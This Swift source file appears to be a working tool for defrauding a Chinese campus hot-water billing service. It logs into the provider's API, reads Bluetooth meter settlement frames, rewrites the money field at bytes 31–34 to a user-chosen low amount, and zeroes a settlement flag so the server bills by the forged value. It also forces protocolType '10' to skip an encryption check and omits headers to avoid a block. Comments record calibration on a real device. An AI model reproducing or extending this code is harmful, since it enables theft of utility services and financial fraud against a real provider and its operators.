//
//  TamperEngine.swift
//  业务编排：登录 → 取费率包 → 开阀 → 关阀 → 采集 → ★篡改 → 上传(proto=10) → 解 clData → 0x86 写回
//
//  与 Android 版 TamperEngine.kt 一一对应。
//
import Foundation

// MARK: - 账号

struct QzxyAccount {
    let loginCode: String
    let userId: String
    let phone: String
    /// 来自登录响应 data.userAccount.accountId（对齐 LinYu AuthRepository.kt:25）
    var accountId: String = "14204"
    /// 同上，来自 data.userAccount.projectId
    var projectId: String = "506"
    /// true = 从登录响应真实解析；false = 用的默认值
    var resolvedFromLogin: Bool = false

    var authFields: [String: String] {
        ["loginCode": loginCode, "userId": userId, "accountId": accountId,
         "projectId": projectId, "telephone": phone, "telPhone": phone,
         "phoneSystem": "android", "version": "6.5.28"]
    }
}

// MARK: - API

enum QzxyApi {
    static let base = "https://v3-api.china-qzxy.cn"

    /// 表单 POST。⚠️ 刻意不附带 Config-Project/Config-Keys 头
    /// （实测：带上会被 531 拦截，不带才回传 clData）
    static func post(_ path: String, fields: [String: String],
                     withConfigHeaders: Bool = false) async throws -> String {
        var req = URLRequest(url: URL(string: base + path)!)
        req.httpMethod = "POST"
        req.setValue("application/x-www-form-urlencoded; charset=UTF-8",
                     forHTTPHeaderField: "Content-Type")
        req.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                     forHTTPHeaderField: "User-Agent")
        if withConfigHeaders {
            req.setValue(fields["projectId"] ?? "506", forHTTPHeaderField: "Config-Project")
            req.setValue("module_list,advertise_type,question_list,service_phone_list," +
                         "banner_list_app,activity_list_app,aliCard_popup_config",
                         forHTTPHeaderField: "Config-Keys")
        }
        req.httpBody = fields
            .map { "\(urlEncode($0.key))=\(urlEncode($0.value))" }
            .joined(separator: "&").data(using: .utf8)

        let (data, _) = try await URLSession.shared.data(for: req)
        return String(data: data, encoding: .utf8) ?? ""
    }

    static func urlEncode(_ s: String) -> String {
        var allowed = CharacterSet.alphanumerics
        allowed.insert(charactersIn: "-._~")
        return s.addingPercentEncoding(withAllowedCharacters: allowed) ?? s
    }

    static func login(phone: String, password: String) async throws -> QzxyAccount? {
        // 密码：MD5 后 10 位大写
        let full = QzxyCrypto.md5Hex(password).uppercased()
        let pw = String(full.suffix(10))
        let resp = try await post("/user/login", fields: [
            "telephone": phone, "password": pw,
            "phoneSystem": "android", "type": "0", "version": "6.5.28"])
        guard let json = try? JSONSerialization.jsonObject(with: Data(resp.utf8)) as? [String: Any],
              (json["success"] as? Bool) == true,
              let d = json["data"] as? [String: Any],
              let lc = d["loginCode"] as? String else { return nil }
        // userId 可能是 Int 或 String，必须显式转换（否则会得到 "Optional(123)"）
        let uid: String
        if let n = d["userId"] as? Int { uid = String(n) }
        else if let s = d["userId"] as? String { uid = s }
        else { return nil }
        // ── 解析 accountId / projectId（对齐 LinYu AuthRepository.kt:25）──
        // 响应结构: data.userAccount.accountId / data.userAccount.projectId
        // 这两个值每个请求都要带；写死会在其他账号上失败。
        var aid = "14204"
        var pid = "506"
        var resolved = false
        if let ua = d["userAccount"] as? [String: Any] {
            if let n = ua["accountId"] as? Int { aid = String(n); resolved = true }
            else if let s = ua["accountId"] as? String, !s.isEmpty { aid = s; resolved = true }
            if let n = ua["projectId"] as? Int { pid = String(n) }
            else if let s = ua["projectId"] as? String, !s.isEmpty { pid = s }
        }
        // 部分部署把 accountId 直接放 data 顶层
        if !resolved {
            if let n = d["accountId"] as? Int { aid = String(n); resolved = true }
            else if let s = d["accountId"] as? String, !s.isEmpty { aid = s; resolved = true }
            if let n = d["projectId"] as? Int { pid = String(n) }
            else if let s = d["projectId"] as? String, !s.isEmpty { pid = s }
        }

        return QzxyAccount(loginCode: lc, userId: uid, phone: phone,
                           accountId: aid, projectId: pid, resolvedFromLogin: resolved)
    }

    /// 取费率包（服务端不校验 randomNumber 真伪）
    static func rateOrder(acc: QzxyAccount, deviceId: String, mac: String, macType: String,
                          bigTypeId: String, smallTypeId: String,
                          protocolType: String, randomNumber: String) async throws -> [String: Any]? {
        guard let sig = QzxySigner.signRateOrder(loginCode: acc.loginCode, telephone: acc.phone,
                                                 deviceId: deviceId, xfModel: "0",
                                                 randomNumber: randomNumber) else { return nil }
        var f = acc.authFields
        f.merge(["deviceId": deviceId, "macAddress": mac, "macType": macType,
                 "bigTypeId": bigTypeId, "smallTypeId": smallTypeId,
                 "protocolType": protocolType, "randomNumber": randomNumber.lowercased(),
                 "xfModel": "0", "signature": sig]) { _, b in b }
        let resp = try await post("/order/downRate/bluetooth/rateOrder", fields: f)
        guard let json = try? JSONSerialization.jsonObject(with: Data(resp.utf8)) as? [String: Any],
              (json["success"] as? Bool) == true else { return nil }
        return json["data"] as? [String: Any]
    }

    /// ★ 上传（篡改后）。protocolType 固定 "10" 以跳过 226 加密校验
    static func uploadTampered(acc: QzxyAccount, xfData: String,
                               protocolType: String = "10",
                               randomNumber: String = "deadbeef") async throws -> String {
        guard let sig = QzxySigner.signUpload(loginCode: acc.loginCode,
                                              telephone: acc.phone,
                                              xfData: xfData) else { return "" }
        var f = acc.authFields
        f.merge(["protocolType": protocolType, "randomNumber": randomNumber,
                 "xfData": xfData.lowercased(), "signature": sig]) { _, b in b }
        return try await post("/order/upload/bluetooth/data", fields: f)
    }

    /// 失败上报
    static func reportFail(acc: QzxyAccount, consumeDate: String) async throws -> String {
        guard let sig = QzxySigner.signFail(loginCode: acc.loginCode,
                                            telephone: acc.phone,
                                            consumeDate: consumeDate) else { return "" }
        var f = acc.authFields
        f.merge(["consumeDate": consumeDate, "signature": sig]) { _, b in b }
        return try await post("/order/upload/bluetooth/fail", fields: f)
    }
}

// MARK: - 金额控额（结算改写）
//
// ┌─ 预置标定 · 真机实测 2026-10-16 ────────────────────────────┐
// │ 设备：热水表 C47F0E2698C8（Android 端 vivo V2454A 实测三笔）│
// │   样本1 ¥0.05   字节31..34 = 32 00 00 00  （小端 = 50  ）  │
// │   样本2 ¥0.15   字节31..34 = 96 00 00 00  （小端 = 150 ）  │
// │   样本3 ¥0.15   字节31..34 = 96 00 00 00  （小端 = 150 ）  │
// │ 逐字节比对：42B 帧中仅字节 5、6（时间）与 31（金额）变化；  │
// │ 按小端 32 位解释时 [50,150,150] 与 upMoney(厘) 逐一吻合。  │
// │ → 金额字段 = 字节 31..34，小端 32 位，单位【厘】           │
// │   1 厘 = 0.001 元；字节 35 恒为 32(=50) 属另一字段，不动它 │
// └────────────────────────────────────────────────────────────┘

enum TamperMode: String, CaseIterable, Identifiable {
    /// 只记录、不改写（对照/排查用）
    case probe  = "采样"
    /// 按目标金额改写（不管用多少水，落点固定）
    case target = "控额"

    var id: String { rawValue }

    var hint: String {
        switch self {
        case .probe:  return "不改数据，只记录"
        case .target: return "按目标金额改写"
        }
    }
}

enum XfDataTamper {

    // ── 字段位置（真机标定，无需再采样）──
    static let usageStart   = 31
    static let usageEnd     = 34
    /// 每个单位对应多少元（1 单位 = 1 厘 = 0.001 元）
    static let moneyPerUnit = 0.001
    /// 起步价（与用量无关的固定部分）
    static let baseMoney    = 0.0
    static let littleEndian = true
    /// 单笔安全上限（元）——超过就不改写，避免误操作
    static let hardLimitYuan = 10.0

    // ── 运行期状态（由界面写入）──
    static var enabled    = false
    static var mode: TamperMode = .probe
    /// true=用固定金额；false=用区间
    static var useFixed   = false
    static var fixedYuan  = 0.06
    static var minYuan    = 0.10
    static var maxYuan    = 0.50
    static var randomize  = true

    /// 本次改写时被归零的标志位原值（"01"/"06"/"0b"…）；nil 表示本来就是 00
    /// 用于界面提示"检测到补结算帧，已强制单笔"
    static var lastFlagReset: String? = nil

    /// 取本次目标金额（元）
    static func pickTarget() -> Double {
        if useFixed { return fixedYuan }
        let lo = Swift.min(minYuan, maxYuan)
        let hi = Swift.max(minYuan, maxYuan)
        if !randomize { return (lo + hi) / 2 }
        return lo + Double.random(in: 0...(hi - lo))
    }

    /// 状态描述（显示在界面上）
    static func describe() -> String {
        guard enabled else { return "关闭（按真实用量记账）" }
        let base: String
        if useFixed { base = "控额 固定 ¥" + String(format: "%.2f", fixedYuan) }
        else {
            base = "控额 ¥" + String(format: "%.2f", minYuan)
                + "~¥" + String(format: "%.2f", maxYuan)
                + (randomize ? " 随机" : "")
        }
        if let f = lastFlagReset {
            return base + "（上笔强制单笔：标志位 " + f + "→00）"
        }
        return base
    }

    /// 从帧里读出「金额」（元）；字段未命中返回 nil
    static func readAmount(_ hex: String) -> Double? {
        let clean = hex.lowercased().replacingOccurrences(of: " ", with: "")
        guard clean.count % 2 == 0 else { return nil }
        guard usageEnd < clean.count / 2 else { return nil }

        let seg = sliceHex(clean, usageStart, usageEnd)
        let ordered = littleEndian ? reverseBytes(seg) : seg
        guard let raw = UInt64(ordered, radix: 16) else { return nil }
        return baseMoney + Double(raw) * moneyPerUnit
    }

    /// 把金额字段改写成 targetYuan 元。
    /// - Returns: (新帧小写, 写入的厘值)；失败返回 nil
    static func rewrite(_ hex: String, targetYuan: Double) -> (frame: String, cents: Int)? {
        let clean = hex.lowercased().replacingOccurrences(of: " ", with: "")
        guard clean.count % 2 == 0 else { return nil }
        let n = clean.count / 2
        guard usageEnd < n else { return nil }
        guard targetYuan > 0, targetYuan <= hardLimitYuan else { return nil }

        let width = usageEnd - usageStart + 1
        var want = Int(((targetYuan - baseMoney) / moneyPerUnit).rounded())
        if want < 0 { want = 0 }
        let maxVal = (1 << (width * 8)) - 1
        if want > maxVal { want = maxVal }

        var hx = String(want, radix: 16).lowercased()
        while hx.count < width * 2 { hx = "0" + hx }
        hx = String(hx.suffix(width * 2))
        if littleEndian { hx = reverseBytes(hx) }

        var chars = Array(clean)
        for i in 0..<width {
            let src = hx.index(hx.startIndex, offsetBy: i * 2)
            let p = (usageStart + i) * 2
            chars[p]     = hx[src]
            chars[p + 1] = hx[hx.index(after: src)]
        }

        // ── 【同步 Android 2026-10-17】偏移 30 = 累计/补结算标志位 ──
        //
        // 真机实测（C47F0E2698C8，Android 端 14 笔样本）：
        //   偏移30=00 → 服务端按本帧 31-34 记账   → 上传 50 厘，实扣 0.05 ✓
        //   偏移30=01 → 服务端绕过 31-34 自算     → 上传 50 厘，实扣 0.306 ✗
        //               （服务端读的是偏移 30-31 的大端 2 字节：0x0132 = 306）
        //   偏移30=06 → 服务端读 0x0664 = 1636（实扣 1596）
        //
        // 其余字节（26-29 / 35 / MAC）四笔完全一致，差异只在这一个字节。
        // 归零后服务端只走单笔结算路径，金额以 31-34 为准。
        lastFlagReset = nil
        let flagIdx = usageStart - 1
        if flagIdx >= 0, flagIdx * 2 + 1 < chars.count {
            let cur = "\(chars[flagIdx * 2])\(chars[flagIdx * 2 + 1])"
            if cur != "00" {
                chars[flagIdx * 2]     = "0"
                chars[flagIdx * 2 + 1] = "0"
                lastFlagReset = cur
            }
        }

        return (String(chars), want)
    }

    /// 对比两帧，列出差异字节索引（排查/重标定用）
    static func diff(_ a: String, _ b: String) -> [Int] {
        let x = Array(a.lowercased()), y = Array(b.lowercased())
        let n = min(x.count, y.count) / 2
        var out: [Int] = []
        for i in 0..<n {
            if x[i * 2] != y[i * 2] || x[i * 2 + 1] != y[i * 2 + 1] { out.append(i) }
        }
        return out
    }

    // ── 小工具 ──

    /// 取 [from, to] 字节区间对应的 hex 子串
    private static func sliceHex(_ hex: String, _ from: Int, _ to: Int) -> String {
        let s = hex.index(hex.startIndex, offsetBy: from * 2)
        let e = hex.index(s, offsetBy: (to - from + 1) * 2)
        return String(hex[s..<e])
    }

    /// 按 1 字节为单位反转（hex 大小端互换）
    private static func reverseBytes(_ hex: String) -> String {
        stride(from: 0, to: hex.count, by: 2).map { i -> String in
            let s = hex.index(hex.startIndex, offsetBy: i)
            return String(hex[s..<hex.index(s, offsetBy: 2)])
        }.reversed().joined()
    }
}
